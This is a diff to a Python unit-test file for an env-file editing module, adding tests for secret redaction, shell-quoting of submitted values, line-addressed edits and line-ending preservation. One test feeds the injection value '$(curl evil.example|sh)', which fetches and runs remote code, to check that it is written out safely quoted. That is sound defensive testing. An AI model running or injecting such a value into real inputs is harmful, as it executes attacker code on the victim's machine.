@@ -7,9 +7,9 @@ from unittest import mock
 
 from sparkdeck.envfile_settings import (
     EnvFileConflictError,
-    SECRET_KEY_PATTERN,
     apply_env_updates,
     field_mapping,
+    is_secret_entry,
     parse_env_file,
     resolve_control_updates,
 )
@@ -56,10 +56,21 @@ class ParseEnvFileTests(unittest.TestCase):
 
     def test_secret_key_pattern_matches_credential_substrings(self):
         # Substring matching is intentionally broad: MONKEY contains KEY.
-        for key in ("API_TOKEN", "HF_TOKEN", "MY_SECRET", "admin_password", "SSH_KEY", "MONKEY"):
-            self.assertTrue(SECRET_KEY_PATTERN.search(key), key)
+        for key in (
+            "API_TOKEN", "HF_TOKEN", "MY_SECRET", "admin_password", "SSH_KEY",
+            "MONKEY", "SENTRY_DSN", "AUTHORIZATION", "DB_CREDENTIALS",
+        ):
+            self.assertTrue(is_secret_entry(key, "x"), key)
         for key in ("MAX_MODEL_LEN", "SERVED_MODEL_NAME", "GPU_MEMORY_UTILIZATION"):
-            self.assertFalse(SECRET_KEY_PATTERN.search(key), key)
+            self.assertFalse(is_secret_entry(key, "262144"), key)
+
+    def test_secret_value_shapes_are_redacted_regardless_of_key_name(self):
+        self.assertTrue(is_secret_entry(
+            "DATABASE_URL", "postgres://user:pass@host:5432/db",
+        ))
+        self.assertTrue(is_secret_entry("SCM_HEADER", "Bearer abc.def.ghi"))
+        self.assertFalse(is_secret_entry("DATABASE_URL", "postgres://host:5432/db"))
+        self.assertFalse(is_secret_entry("MAX_MODEL_LEN", "262144"))
 
 
 class ApplyEnvUpdatesTests(unittest.TestCase):
@@ -79,9 +90,36 @@ class ApplyEnvUpdatesTests(unittest.TestCase):
         self.assertEqual(result, SAMPLE)
 
     def test_update_active_value_preserves_inline_comment_and_export(self):
-        result = self._write_and_read({"SERVED_MODEL_NAME": "'org/new'"})
+        result = self._write_and_read({"SERVED_MODEL_NAME": "org/new"})
 
-        self.assertIn("export SERVED_MODEL_NAME='org/new'  # name clients see\n", result)
+        self.assertIn("export SERVED_MODEL_NAME=org/new  # name clients see\n", result)
+
+    def test_submitted_values_with_shell_metacharacters_are_single_quoted(self):
+        result = self._write_and_read({
+            "MAX_MODEL_LEN": "$(curl evil.example|sh)",
+            "API_TOKEN": "a b",
+        })
+
+        self.assertIn("MAX_MODEL_LEN='$(curl evil.example|sh)'\n", result)
+        self.assertIn("API_TOKEN='a b'\n", result)
+
+    def test_submitted_single_quotes_are_escaped_for_source_safety(self):
+        result = self._write_and_read({"API_TOKEN": "it's"})
+
+        self.assertIn("API_TOKEN='it'\\''s'\n", result)
+
+    def test_appended_values_are_shell_quoted_and_empty_stays_bare(self):
+        result = self._write_and_read({"NEW_VAR": "a b", "EMPTY_VAR": ""})
+
+        self.assertIn("NEW_VAR='a b'\n", result)
+        self.assertIn("EMPTY_VAR=\n", result)
+
+    def test_keeping_an_existing_value_never_requotes_it(self):
+        result = self._write_and_read({
+            "SERVED_MODEL_NAME": {"value": None, "enabled": False},
+        })
+
+        self.assertIn("# export SERVED_MODEL_NAME='org/model'  # name clients see\n", result)
 
     def test_plain_string_enables_commented_key_in_place(self):
         result = self._write_and_read({"MAX_NUM_SEQS": "16"})
@@ -150,8 +188,10 @@ class ApplyEnvUpdatesTests(unittest.TestCase):
         entries = parse_env_file(self.path.read_text(encoding="utf-8"))
         self.assertEqual(entries[0]["value"], '"a\\"b"')
 
-        result = self._write_and_read({"NAME": '"c\\\\d"'})
-        self.assertEqual(result, 'NAME="c\\\\d"  # desc\n')
+        # Submitted values are raw text and shell-quoted on write; the
+        # trailing comment survives.
+        result = self._write_and_read({"NAME": "c\\d"})
+        self.assertEqual(result, "NAME='c\\d'  # desc\n")
 
     def test_rendered_output_is_validated_before_writing(self):
         # Just under the file limit; the appended value pushes it over.
@@ -212,6 +252,77 @@ class ApplyEnvUpdatesTests(unittest.TestCase):
         self.assertIn("MAX_MODEL_LEN=131072", target.read_text(encoding="utf-8"))
         self.assertEqual(result["path"], str(link))
         self.assertTrue(Path(f"{target}.bak").exists())
+
+    def test_line_addressed_delete_targets_the_exact_duplicate_row(self):
+        self.path.write_text("MAX_MODEL_LEN=1024\nMAX_MODEL_LEN=4096\n", encoding="utf-8")
+
+        result = self._write_and_read([
+            {"key": "MAX_MODEL_LEN", "line": 1, "value": None},
+        ])
+
+        self.assertEqual(result, "MAX_MODEL_LEN=4096\n")
+
+    def test_line_addressed_enable_edits_the_exact_commented_row(self):
+        self.path.write_text("# MAX_NUM_SEQS=16\n# MAX_NUM_SEQS=32\n", encoding="utf-8")
+
+        result = self._write_and_read([
+            {"key": "MAX_NUM_SEQS", "line": 1, "value": {"value": None, "enabled": True}},
+        ])
+
+        self.assertEqual(result, "MAX_NUM_SEQS=16\n# MAX_NUM_SEQS=32\n")
+
+    def test_line_addressed_op_rejects_a_key_mismatch(self):
+        with self.assertRaises(ValueError):
+            apply_env_updates(self.path, [
+                {"key": "MAX_NUM_SEQS", "line": 2, "value": "16"},
+            ])
+
+    def test_line_addressed_op_rejects_a_line_without_the_entry(self):
+        with self.assertRaises(ValueError):
+            apply_env_updates(self.path, [
+                {"key": "MAX_MODEL_LEN", "line": 1, "value": "1"},
+            ])
+        with self.assertRaises(ValueError):
+            apply_env_updates(self.path, [
+                {"key": "MAX_MODEL_LEN", "line": 999, "value": "1"},
+            ])
+
+    def test_list_form_rejects_malformed_operations(self):
+        with self.assertRaises(ValueError):
+            apply_env_updates(self.path, [{"key": "MAX_MODEL_LEN"}])
+        with self.assertRaises(ValueError):
+            apply_env_updates(self.path, [
+                {"key": "MAX_MODEL_LEN", "line": 0, "value": "1"},
+            ])
+        with self.assertRaises(ValueError):
+            apply_env_updates(self.path, [
+                {"key": "MAX_MODEL_LEN", "value": "1", "bogus": True},
+            ])
+
+    def test_crlf_file_stays_crlf_and_untouched_lines_byte_identical(self):
+        content = "# comment\r\nMAX_MODEL_LEN=262144\r\n\r\nAPI_TOKEN=x\r\n"
+        self.path.write_bytes(content.encode("utf-8"))
+
+        self._write_and_read({"MAX_MODEL_LEN": "131072"})
+
+        self.assertEqual(
+            self.path.read_bytes().decode("utf-8"),
+            "# comment\r\nMAX_MODEL_LEN=131072\r\n\r\nAPI_TOKEN=x\r\n",
+        )
+
+    def test_appended_lines_use_the_files_dominant_terminator(self):
+        self.path.write_bytes(b"A=1\r\nB=2\r\n")
+
+        self._write_and_read({"NEW_VAR": "x"})
+
+        self.assertEqual(self.path.read_bytes(), b"A=1\r\nB=2\r\nNEW_VAR=x\r\n")
+
+    def test_lf_file_appends_lf_and_missing_final_newline_is_added(self):
+        self.path.write_bytes(b"A=1")
+
+        self._write_and_read({"NEW_VAR": "x"})
+
+        self.assertEqual(self.path.read_bytes(), b"A=1\nNEW_VAR=x\n")
 
     def test_new_key_appends_at_end_of_file(self):
         result = self._write_and_read({"MTP_NUM_TOKENS": "3"})
@@ -347,13 +458,47 @@ class ResolveControlUpdatesTests(unittest.TestCase):
         })
 
     def test_skips_none_and_empty_values(self):
+        entries = parse_env_file("MAX_MODEL_LEN=1024\n")
+
+        updates = resolve_control_updates(
+            {"context_window": 131072, "kv_cache_dtype": ""}, None, None, entries,
+        )
+
+        self.assertEqual(updates, {"MAX_MODEL_LEN": "131072"})
+
+    def test_null_for_a_mapped_control_comments_the_variable_out(self):
         entries = parse_env_file(SAMPLE)
 
         updates = resolve_control_updates(
-            {"context_window": None, "kv_cache_dtype": ""}, None, None, entries,
+            {"context_window": None, "max_concurrency": None}, None, None, entries,
+        )
+
+        self.assertEqual(updates, {
+            "MAX_MODEL_LEN": {"value": None, "enabled": False},
+            # MAX_NUM_SEQS is commented out in the file but still backed.
+            "MAX_NUM_SEQS": {"value": None, "enabled": False},
+        })
+
+    def test_null_for_an_unmapped_control_is_skipped(self):
+        entries = parse_env_file("MAX_MODEL_LEN=1024\n")
+
+        updates = resolve_control_updates(
+            {"max_concurrency": None, "thinking_mode": None}, None, None, entries,
         )
 
         self.assertEqual(updates, {})
+
+    def test_null_mapped_control_comments_the_line_in_the_file(self):
+        with tempfile.TemporaryDirectory() as directory:
+            path = Path(directory) / ".env.test"
+            path.write_text(SAMPLE, encoding="utf-8")
+            apply_env_updates(path, resolve_control_updates(
+                {"context_window": None}, None, None, parse_env_file(SAMPLE),
+            ))
+
+            self.assertIn(
+                "# MAX_MODEL_LEN=262144\n", path.read_text(encoding="utf-8"),
+            )
 
     def test_empty_served_model_name_is_a_real_edit(self):
         entries = parse_env_file(SAMPLE)
